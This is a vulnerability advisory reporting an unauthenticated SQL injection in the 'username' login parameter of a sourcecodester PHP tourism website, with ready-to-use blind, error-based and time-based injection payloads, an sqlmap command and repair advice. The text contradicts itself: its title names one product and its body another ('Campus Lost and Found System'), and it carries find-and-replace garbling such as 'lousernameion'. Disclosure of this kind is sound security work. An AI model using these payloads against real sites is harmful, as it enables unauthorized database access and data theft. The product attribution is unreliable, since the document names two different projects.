# sourcecodester.com Simple Responsive Tourism Website V1.0 /tourism/classes/Login.php?f=login SQL injection

# username OF AFFECTED PRODUCT(S)

- Campus Lost and Found System
## Vendor Homepage

-  sourcecodester.com

# AFFECTED AND/OR FIXED VERSION(S)

## submitter

- Choco094late

## Vulnerable File

- /tourism/classes/Login.php?f=login

## VERSION(S)

- V1.0

## Software Link

- https://www.sourcecodester.com/php/14838/simple-responsive-tourism-website-using-php-free-source-code.html

# PROBLEM TYPE

## Vulnerability Type

- SQL injection

## Root Cause

- A SQL injection vulnerability was found in the '/tourism/classes/Login.php?f=login ' file of the 'Campus Lost and Found System' project. The reason for this issue is that attackers inject malicious code from the parameter 'username‘ and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact

- Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION

- During the security review of "Campus Lost and Found System",I discovered a critical SQL injection vulnerability in the "/tourism/classes/Login.php?f=login " file. This vulnerability stems from insufficient user input validation of the 'username' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability

# Vulnerability details and POC

## Vulnerability lousernameion:

- 'username' parameter

## Payload:

```makefile
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 7827=7827 AND 'JpDZ'='JpDZ&password=admin123

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 2960 FROM(SELECT COUNT(*),CONCAT(0x7170716b71,(SELECT (ELT(2960=2960,1))),0x716a767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'njkf'='njkf&password=admin123

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: username=admin' OR (SELECT 8515 FROM (SELECT(SLEEP(5)))KHUI) AND 'OXHu'='OXHu&password=admin123
---
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:

```bash
    sqlmap -u "http://10.20.33.16/tourism/classes/Login.php?f=login" --data="username=admin&password=admin123" --dbs
```


![](./assets/1.png)

# Suggested repair

1. **Use prepared statements and parameter binding:**
   Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. **Input validation and filtering:**
   Strictly validate and filter user input data to ensure it conforms to the expected format.

3. **Minimize database user permissions:**
   Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. **Regular security audits:**
   Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
